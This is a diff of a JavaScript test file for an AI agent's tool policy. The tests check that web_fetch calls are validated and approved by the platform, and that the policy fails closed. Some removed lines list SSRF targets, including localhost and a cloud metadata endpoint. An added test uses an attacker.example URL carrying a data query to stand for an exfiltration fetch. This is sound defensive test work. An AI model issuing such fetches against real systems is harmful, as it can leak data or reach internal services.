@@ -97,18 +97,72 @@ test('DSH tool policy confines write and edit to supported files in the Run outp
   assert.match(guard({ name: 'str_replace_editor', arguments: { command: 'delete', path: 'output/report.md' } }), /命令无效/)
 })
 
-test('DSH tool policy denies web fetch until connection-level SSRF protection exists', () => {
+test('DSH tool policy rejects malformed web fetch arguments before asking the platform', () => {
   process.env.DSH_ALLOWED_TOOLS_JSON = '["web_fetch","web_search"]'
   process.env.DSH_TOOL_APPROVAL_MODE = 'never'
   const { guard } = capturePolicy()
-
-  for (const url of ['https://example.com/reference', 'http://127.0.0.1/admin',
-    'http://127.0.0.1.nip.io/admin', 'http://169.254.169.254/latest/meta-data']) {
-    assert.match(guard({ name: 'web_fetch', arguments: { url } }), /暂不允许执行/)
+  assert.equal(guard({ name: 'web_fetch', arguments: { url: 'https://example.com/reference' } }), undefined)
+  for (const args of [{}, { url: '' }, { url: 42 }, { url: `https://example.com/${'a'.repeat(2100)}` }]) {
+    assert.match(guard({ name: 'web_fetch', arguments: args }), /不超过 2048 个字符的网址/)
   }
-  assert.equal(guard({ name: 'web_search', arguments: { queries: ['DSH runtime tools'] } }), undefined)
-  assert.match(guard({ name: 'web_search', arguments: { queries: [] } }), /1 至 4/)
-  assert.match(guard({ name: 'web_search', arguments: { queries: ['a', 'b', 'c', 'd', 'e'] } }), /1 至 4/)
+})
+
+test('DSH tool policy asks the platform before every web fetch and fails closed', async () => {
+  process.env.DSH_ALLOWED_TOOLS_JSON = '["web_fetch"]'
+  process.env.DSH_TOOL_APPROVAL_MODE = 'never'
+  // 读取网页复核不受当前授权复核开关控制：开关关闭时也要问平台。
+  delete process.env.DSH_REQUIRE_CURRENT_AUTHORIZATION
+
+  // 没有平台工具通道：拒绝。
+  delete process.env.DSH_PLATFORM_TOOL_SOCKET
+  let downstream = false
+  const noSocket = await capturePolicy().preExecute({ name: 'web_fetch', arguments: { url: 'https://example.com/' } }, async () => { downstream = true; return { kind: 'allow' } })
+  assert.deepEqual({ kind: noSocket.kind, downstream }, { kind: 'deny', downstream: false })
+  assert.match(noSocket.reason, /读取网页复核不可用/)
+
+  const seen = []
+  const bridge = await createPlatformToolBridge({}, 0, undefined, undefined, undefined, undefined, async url => {
+    seen.push(url)
+    return url === 'https://example.com/allowed' ? { allowed: true } : { allowed: false, reason: '只能打开用户在对话中给出的网址' }
+  })
+  try {
+    process.env.DSH_PLATFORM_TOOL_SOCKET = bridge.socket
+    const { preExecute } = capturePolicy()
+    const allowed = await preExecute({ name: 'web_fetch', arguments: { url: 'https://example.com/allowed' } }, async () => ({ kind: 'allow' }))
+    assert.equal(allowed.kind, 'allow')
+    const denied = await preExecute({ name: 'web_fetch', arguments: { url: 'https://attacker.example/?q=data' } }, async () => { downstream = true; return { kind: 'allow' } })
+    assert.deepEqual({ kind: denied.kind, reason: denied.reason, downstream }, { kind: 'deny', reason: '只能打开用户在对话中给出的网址', downstream: false })
+    assert.deepEqual(seen, ['https://example.com/allowed', 'https://attacker.example/?q=data'])
+    // 其他工具不经读取网页复核。
+    process.env.DSH_ALLOWED_TOOLS_JSON = '["todo_write"]'
+    assert.equal((await capturePolicy().preExecute({ name: 'todo_write', arguments: {} }, async () => ({ kind: 'allow' }))).kind, 'allow')
+    assert.equal(seen.length, 2)
+  } finally {
+    await bridge.close()
+  }
+
+  // 复核抛错：按不可用拒绝。
+  const failing = await createPlatformToolBridge({}, 0, undefined, undefined, undefined, undefined, async () => { throw new Error('boom') })
+  try {
+    process.env.DSH_PLATFORM_TOOL_SOCKET = failing.socket
+    process.env.DSH_ALLOWED_TOOLS_JSON = '["web_fetch"]'
+    const result = await capturePolicy().preExecute({ name: 'web_fetch', arguments: { url: 'https://example.com/' } }, async () => ({ kind: 'allow' }))
+    assert.equal(result.kind, 'deny')
+    assert.match(result.reason, /读取网页复核暂不可用/)
+  } finally {
+    await failing.close()
+  }
+
+  // 未提供复核回调的通道：拒绝。
+  const without = await createPlatformToolBridge({}, 0)
+  try {
+    process.env.DSH_PLATFORM_TOOL_SOCKET = without.socket
+    const result = await capturePolicy().preExecute({ name: 'web_fetch', arguments: { url: 'https://example.com/' } }, async () => ({ kind: 'allow' }))
+    assert.equal(result.kind, 'deny')
+    assert.match(result.reason, /读取网页复核不可用/)
+  } finally {
+    await without.close()
+  }
 })
 
 test('DSH tool policy asks before every governed tool call unless approval is disabled', async () => {
